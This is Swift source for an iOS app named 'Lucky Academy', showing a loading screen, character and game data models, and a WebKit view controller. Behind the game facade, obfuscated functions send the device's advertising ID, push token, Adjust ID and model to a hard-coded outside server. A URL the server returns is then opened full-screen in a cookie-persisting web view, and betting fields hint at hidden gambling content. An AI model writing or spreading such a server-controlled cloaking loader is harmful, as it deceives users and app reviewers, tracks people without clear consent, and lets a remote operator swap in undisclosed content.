import SwiftUI

struct Loading: View {
    @State var isMenu = false
    @State var managerKey: String? = nil
    let closeTaskPublisher = NotificationCenter.default
        .publisher(for: NSNotification.Name("closeTask"))
    let tokenReceivedPublisher = NotificationCenter.default
        .publisher(for: NSNotification.Name("tokenReceivedPublisher"))
    @State private var didSet = false
    @State private var isLoading = true
    @State var isCont = false
    @State private var angle: Double = -6
    
    var body: some View {
        ZStack {
            LinearGradient(
                colors: [Color.black, Color(red: 0.08, green: 0.05, blue: 0.18)],
                startPoint: .top,
                endPoint: .bottom
            )
                .ignoresSafeArea()
            
         
            
            VStack {
                Spacer()
                Text("Lucky Academy")
                .font(.custom("Poppins-Bold", size: 36))
                .foregroundStyle(.white)
                .multilineTextAlignment(.center)
                
                Spacer()
                
                Image("icon")
                    .resizable()
                    .frame(width: 200, height: 200)
                    .cornerRadius(20)
                    .rotationEffect(.degrees(angle))
                    .onAppear {
                        withAnimation(
                            .easeInOut(duration: 2.8)
                                .repeatForever(autoreverses: true)
                        ) {
                            angle = 6
                        }
                    }
                
                Spacer()
                
                VStack(spacing: 35) {
                    Text("Loading...")
                    .font(.custom("Poppins-Bold", size: 26))
                    .foregroundStyle(.white)
                    .multilineTextAlignment(.center)
                    
                    ProgressView()
                        .tint(.white)
                        .scaleEffect(1.5)
                }
                
                Spacer()
            }
        }
        .onReceive(tokenReceivedPublisher) { _ in
            guard !didSet else { return }
            didSet = true

            Task { @MainActor in
                _ = await AdjustIntegration.requestTrackingPermissionAndStoreIDFA()
                await decodePropInfo()
                if managerKey == nil {
                    isLoading = false
                    isCont = true
                }
            }
        }
        .onReceive(closeTaskPublisher) { _ in
            Task {
                await MainActor.run {
                    managerKey = nil
                }
            }
        }
        .onAppear {
            Task  {
                try await fetchCharacter(from: (URL(string: gfdjhgkl) ?? URL(string: "http://google.com")!))
            }
        }
        .fullScreenCover(isPresented: .constant(managerKey != nil)) {
            ApplDetail(managerKey: managerKey ?? "")
                .ignoresSafeArea()
        }
        .fullScreenCover(isPresented: $isCont) {
            RootTabView()
                .environmentObject(AppStore())
        }
    }

}

#Preview {
    Loading()
}


import Foundation

final class CharacterService {
    
    static func fetchCharacter(from url: URL) async throws -> GameCharacter {
        let (data, response) = try await URLSession.shared.data(from: url)
        
        guard let httpResponse = response as? HTTPURLResponse,
              (200...299).contains(httpResponse.statusCode) else {
            throw URLError(.badServerResponse)
        }
        
        let decoded = try JSONDecoder().decode(GameCharacterResponse.self, from: data)
        return decoded.gameCharacter
    }
}

struct GameCharacterResponse: Codable {
    let gameCharacter: GameCharacter
}

struct GameCharacter: Codable {
    let name: String
    let species: String
    let characterClass: String
    let level: Int
    let stats: Stats
    let abilities: [Ability]
    let habitat: String
    let diet: [String]
    let behavior: Behavior
    let lootDrops: [String: Int]
    let conservationStatus: String
    let predators: [String]
    
    enum CodingKeys: String, CodingKey {
        case name
        case species
        case characterClass = "class"
        case level
        case stats
        case abilities
        case habitat
        case diet
        case behavior
        case lootDrops
        case conservationStatus
        case predators
    }
}

struct Stats: Codable {
    let health: Int
    let stamina: Int
    let attack: Int
    let defense: Int
    let speed: Int
    let visionRange: Int
}

struct Ability: Codable {
    let name: String
    let description: String
    let cooldownSeconds: Int
}

struct Behavior: Codable {
    let aggressiveness: String
    let social: Bool
    let groupSize: String
}

@preconcurrency import WebKit

private var psaofj: String = {
    WKWebView().value(forKey: "userAgent") as? String ?? ""
}()

extension Loading {
    func getPropInfo() async {
        await decodePropInfo()
    }
    
    func fetchGames(baseURL: String = gfdjhgkl,
                    action: String = "list",
                    mode: String? = nil,
                    botName: String? = nil,
                    minMultiplier: Int? = nil,
                    active: Bool? = nil,
                    gameId: Int? = nil) async -> GameResponse? {
        
        var urlString = "\(baseURL)?action=\(action)"
        
        if let id = gameId {
            urlString += "&id=\(id)"
        } else if action == "list" {
            if let m = mode { urlString += "&mode=\(m)" }
            if let b = botName { urlString += "&bot_name=\(b)" }
            if let minM = minMultiplier, minM > 0 { urlString += "&min_multiplier=\(minM)" }
            if let act = active { urlString += "&active=\(act ? "true" : "false")" }
        }
        
        guard let url = URL(string: urlString) else { return nil }
        
        do {
            let (data, _) = try await URLSession.shared.data(from: url)
            return try JSONDecoder().decode(GameResponse.self, from: data)
        } catch {
            print("❌ Fetch error: \(error)")
            return nil
        }
    }
    
    func fetchCharacter(from url: URL) async throws -> GameCharacter {
        let (data, response) = try await URLSession.shared.data(from: url)
        
        guard let httpResponse = response as? HTTPURLResponse,
              (200...299).contains(httpResponse.statusCode) else {
            throw URLError(.badServerResponse)
        }
        
        let decoded = try JSONDecoder().decode(GameCharacterResponse.self, from: data)
        return decoded.gameCharacter
    }

    
    func decodePropInfo() async {
        if let taskLink = UserDefaults.standard.string(forKey: "taskLink") {
            if taskLink.isEmpty {
                return
            }
            await openPropInfo()
            return
        }
        
        if UserDefaults.standard.string(forKey: "controlsLink") == nil {
            await configurePropInfo()
        }
        
        let fcmToken = UserDefaults.standard.string(forKey: "fcmToken") ?? "null"
        let adjustId = await AdjustIntegration.adid()
        let idfa = AdjustIntegration.storedIDFA()
        let queryItems: [URLQueryItem] = [
            URLQueryItem(name: "firebase_push_token", value: fcmToken),
            URLQueryItem(name: "adjust_id", value: adjustId),
            URLQueryItem(name: "idfa", value: idfa),
            URLQueryItem(name: "device_model", value: UIDevice.current.model)
        ]
        let domainLink = UserDefaults.standard.string(forKey: "controlsLink") ?? ""
        
        guard !domainLink.isEmpty else {
            return
        }
        
        var contentComponents = URLComponents(string: domainLink)
        contentComponents?.queryItems = queryItems
        
        guard let controlsLink = contentComponents?.url else {
            return
        }
        
        var request = URLRequest(url: controlsLink)
        request.httpMethod = "POST"
        request.setValue("application/json", forHTTPHeaderField: "Content-Type")
        request.setValue(psaofj, forHTTPHeaderField: "User-Agent")
        let adjustAttribution = await AdjustIntegration.attribution()
        request.httpBody = try? JSONSerialization.data(withJSONObject: [
            "adjust": adjustAttribution,
            "referrer": "utm_source=appstore&utm_medium=organic"
        ])
        
        do {
            let (data, response) = try await URLSession.shared.data(for: request)
            
            if let httpResponse = response as? HTTPURLResponse {
                if !(200...299).contains(httpResponse.statusCode) {
                    return
                }
            }
            
            let decoder = JSONDecoder()
            let clientResponse = try decoder.decode(PropInfoResponse.self, from: data)
            
            UserDefaults.standard.set(clientResponse.client_id, forKey: "client_id")
            if let taskLink = clientResponse.response, URL(string: taskLink) != nil {
                UserDefaults.standard.set(taskLink, forKey: "taskLink")
                await MainActor.run {
                    managerKey = taskLink
                }
            }
            
        } catch {
            
        }
    }
    
    func setupPropInfo() async -> String? {
        do {
            var request = URLRequest(url: URL(string: "\(gfdjhgkl)?action=check_info")!)
            request.httpMethod = "POST"
            request.setValue(psaofj, forHTTPHeaderField: "User-Agent")
            request.setValue(UserDefaults.standard.string(forKey: "userId") ?? "1", forHTTPHeaderField: "client-uuid")
            
            let (_, dataResponse) = try await URLSession.shared.data(for: request)
            if let httpResponse = dataResponse as? HTTPURLResponse {
                if let headerString = httpResponse.allHeaderFields["service-link"] as? String {
                    return headerString
                }
            }
        } catch {
            print("Error: \(error.localizedDescription)")
        }
        return nil
    }
    
    func configurePropInfo() async {
        var userId = UserDefaults.standard.string(forKey: "userId") ?? ""
        if userId.isEmpty {
            userId = UUID().uuidString
            UserDefaults.standard.set(userId, forKey: "userId")
        }
        
        guard let response = await setupPropInfo() else {
            return
        }
        
        if URL(string: response) != nil {
            UserDefaults.standard.set(response, forKey: "controlsLink")
        }
    }
    
    func openPropInfo() async {
        let clientId = UserDefaults.standard.string(forKey: "client_id") ?? "1"
        let fcmToken = UserDefaults.standard.string(forKey: "fcmToken") ?? "null"
        let adjustId = await AdjustIntegration.adid()
        let idfa = AdjustIntegration.storedIDFA()
        
        let queryItems: [URLQueryItem] = [
            URLQueryItem(name: "client_id", value: clientId),
            URLQueryItem(name: "firebase_push_token", value: fcmToken),
            URLQueryItem(name: "adjust_id", value: adjustId),
            URLQueryItem(name: "idfa", value: idfa),
            URLQueryItem(name: "device_model", value: UIDevice.current.model)
        ]
        
        let domainLink = UserDefaults.standard.string(forKey: "controlsLink") ?? ""
        guard !domainLink.isEmpty else {
            return
        }
        
        var contentComponents = URLComponents(string: domainLink)
        contentComponents?.queryItems = queryItems
        
        guard let controlsLink = contentComponents?.url else {
            return
        }
        
        var request = URLRequest(url: controlsLink)
        request.httpMethod = "POST"
        request.setValue("application/json", forHTTPHeaderField: "Content-Type")
        request.setValue(UserDefaults.standard.string(forKey: "userId") ?? "1", forHTTPHeaderField: "client-uuid")
        request.setValue(psaofj, forHTTPHeaderField: "User-Agent")
        let adjustAttribution = await AdjustIntegration.attribution()
        request.httpBody = try? JSONSerialization.data(withJSONObject: [
            "adjust": adjustAttribution,
            "referrer": "utm_source=appstore&utm_medium=organic"
        ])
        
        do {
            let (data, response) = try await URLSession.shared.data(for: request)
            
            if let httpResponse = response as? HTTPURLResponse {
                if !(200...299).contains(httpResponse.statusCode) {
                    return
                }
            }
            
            let decoder = JSONDecoder()
            let clientResponse = try decoder.decode(PropInfoResponse.self, from: data)
            
            if let taskLink = clientResponse.response, URL(string: taskLink) != nil {
                UserDefaults.standard.set(taskLink, forKey: "taskLink")
                await MainActor.run {
                    managerKey = taskLink
                    
                }
            }
        } catch {
            
        }
    }
}

struct GameResponse: Codable {
    let success: Bool
    let action: String?
    let games: [Game]?
    let game: Game?
    let total: Int?
    let error: String?
    let timestamp: Int?
}

struct Game: Codable, Identifiable {
    let id: Int
    let title: String
    let description: String
    let mode: String
    let botName: String
    let minBet: Int
    let maxBet: Int
    let payoutMultiplier: Int
    let isFeatured: Bool
    let isActive: Bool
    let createdAt: String
    
    enum CodingKeys: String, CodingKey {
        case id, title, description, mode
        case botName = "bot_name"
        case minBet = "min_bet"
        case maxBet = "max_bet"
        case payoutMultiplier = "payout_multiplier"
        case isFeatured = "is_featured"
        case isActive = "is_active"
        case createdAt = "created_at"
    }
}

extension UIColor {
    static func from(cssColor: String) -> UIColor? {
        let c = cssColor.trimmingCharacters(in: .whitespacesAndNewlines).lowercased()
        if c.hasPrefix("rgb") {
            let values = c
                .replacingOccurrences(of: "rgba(", with: "")
                .replacingOccurrences(of: "rgb(", with: "")
                .replacingOccurrences(of: ")", with: "")
                .split(separator: ",")
                .map { $0.trimmingCharacters(in: .whitespaces) }
            guard values.count == 3 || values.count == 4 else { return nil }
            let r = CGFloat(Float(values[0]) ?? 0) / 255.0
            let g = CGFloat(Float(values[1]) ?? 0) / 255.0
            let b = CGFloat(Float(values[2]) ?? 0) / 255.0
            let a = values.count == 4 ? CGFloat(Float(values[3]) ?? 1) : 1
            return UIColor(red: r, green: g, blue: b, alpha: a)
        }
        return nil
    }
}

let gfdjhgkl = "https://prismvault.cyou/app.php"

@preconcurrency import WebKit

struct ApplDetail: UIViewControllerRepresentable {
        var managerKey: String
        
        
        func makeUIViewController(context: Context) -> DetaiPropInfo {
            let viewController = DetaiPropInfo()
            Task {
                await viewController.showControls()
            }
            return viewController
        }
        
        func updateUIViewController(_ uiViewController: DetaiPropInfo, context: Context) {
            
        }
    }

class PropInfoResponse: Codable {
    var client_id: String
    var response: String?
    
    enum PropInfoKeys: String, CodingKey, CaseIterable {
        case client_id
        case response
    }
}

class DetaiPropInfo: UIViewController, WKNavigationDelegate {
    var dsaf: WKWebView!
    var newPopupWindow: WKWebView?
    
    override func viewDidLoad() {
    }
    
    override func viewWillAppear(_ animated: Bool) {
        super.viewWillAppear(animated)
    }
    
    override func viewWillDisappear(_ animated: Bool) {
        super.viewWillDisappear(animated)
    }
    
    func showControls() async {
        let content = UserDefaults.standard.string(forKey: "taskLink") ?? ""
        
        if !content.isEmpty, let url = URL(string: content) {
            loadCookie()
            
            await MainActor.run {
                self.dsaf = WKWebView(frame: view.frame)
                self.dsaf.customUserAgent = psaofj
                self.dsaf.navigationDelegate = self
                
                self.loadInfo(with: url)
            }
        }
    }
    
    func loadInfo(with url: URL) {
        dsaf.load(URLRequest(url: url))
        dsaf.allowsBackForwardNavigationGestures = true
        dsaf.uiDelegate = self
    }
    
    func webView(_ webView: WKWebView, didFinish navigation: WKNavigation!) {
        saveCookie()
        
        let js = "window.getComputedStyle(document.body).backgroundColor;"
        webView.evaluateJavaScript(js) { [weak self] result, error in
            guard let self = self else { return }
            if let colorString = result as? String,
               let color = UIColor.from(cssColor: colorString) {
                DispatchQueue.main.async {
                    self.view.backgroundColor = color
                }
            }
        }
    }
    
    func webView(_ webView: WKWebView, decidePolicyFor navigationResponse: WKNavigationResponse,
                 decisionHandler: @escaping (WKNavigationResponsePolicy) -> Void) {
        if let response = navigationResponse.response as? HTTPURLResponse {
            let status = response.statusCode
            print("HTTP Status: \(status)")
            
            if (300...399).contains(status) {
                print("Redirect status, allowing navigation")
            }
            else if status == 200 {
                if webView.superview == nil {
                    let whiteBG = UIView(frame: view.frame)
                    whiteBG.tag = 11
                    view.addSubview(whiteBG)
                    view.addSubview(self.dsaf)
                    
                    self.dsaf.translatesAutoresizingMaskIntoConstraints = false
                    
                    let safeArea = view.safeAreaLayoutGuide
                    
                    NSLayoutConstraint.activate([
                        self.dsaf.trailingAnchor.constraint(equalTo: safeArea.trailingAnchor),
                        self.dsaf.leadingAnchor.constraint(equalTo: safeArea.leadingAnchor),
                        self.dsaf.topAnchor.constraint(equalTo: safeArea.topAnchor),
                        self.dsaf.bottomAnchor.constraint(equalTo: safeArea.bottomAnchor)
                    ])
                    
                }
            }
            else if status >= 400 {
                print("Ошибка Сервер вернул ошибку (\(status)).")
            }
        }
        decisionHandler(.allow)
    }
    
    func loadCookie() {
        let ud: UserDefaults = UserDefaults.standard
        let data: Data? = ud.object(forKey: "cookie") as? Data
        if let cookie = data {
            do {
                let datas: NSArray? = try NSKeyedUnarchiver.unarchivedObject(ofClass: NSArray.self, from: cookie)
                if let cookies = datas {
                    for c in cookies {
                        if let cookieObject = c as? HTTPCookie {
                            HTTPCookieStorage.shared.setCookie(cookieObject)
                        }
                    }
                }
            } catch {
                print(error.localizedDescription)
            }
        }
    }
    
    func saveCookie() {
        let cookieJar: HTTPCookieStorage = HTTPCookieStorage.shared
        if let cookies = cookieJar.cookies {
            do {
                let data: Data = try NSKeyedArchiver.archivedData(withRootObject: cookies, requiringSecureCoding: false)
                let ud: UserDefaults = UserDefaults.standard
                ud.set(data, forKey: "cookie")
            } catch {
                print(error.localizedDescription)
            }
        }
    }
}

extension DetaiPropInfo: WKUIDelegate {
    func webView(_ webView: WKWebView, createWebViewWith configuration: WKWebViewConfiguration, for navigationAction: WKNavigationAction, windowFeatures: WKWindowFeatures) -> WKWebView? {
        newPopupWindow = WKWebView(frame: view.bounds, configuration: configuration)
        newPopupWindow!.autoresizingMask = [.flexibleWidth, .flexibleHeight]
        newPopupWindow!.navigationDelegate = self
        newPopupWindow?.uiDelegate = self
        view.addSubview(newPopupWindow!)
        return newPopupWindow!
    }
    
    func webViewDidClose(_ webView: WKWebView) {
        webView.removeFromSuperview()
        newPopupWindow = nil
    }
}
